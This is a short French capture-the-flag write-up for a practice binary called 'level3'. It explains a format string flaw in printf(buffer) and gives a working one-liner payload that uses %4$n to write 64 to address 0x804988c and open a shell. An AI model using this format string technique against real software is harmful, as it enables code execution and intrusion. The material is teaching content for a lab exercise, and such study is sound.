## Level 3

### Analyse

Le binaire présente une vulnérabilité classique de type Format String. Le programme lit l'entrée utilisateur puis l'affiche sans spécifier de format de chaîne sécurisé, avant de vérifier la valeur d'une variable globale pour conditionner l'ouverture d'un shell.

printf(buffer) permet d'utiliser le spécificateur %n, qui écrit le nombre d'octets affichés jusque-là dans une adresse mémoire passée en argument.

Il faut écrire la valeur 64 à l'adresse 0x804988c.

Ton entrée utilisateur commence au 4ème argument sur la pile (trouvé grâce à tes tests avec AAAA.%p...).


### Exploitation

 (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
 
 On poses l'adresse cible sur la pile, printf la voit comme argument %4$n utilise cette adresse et écrit 64 dedans
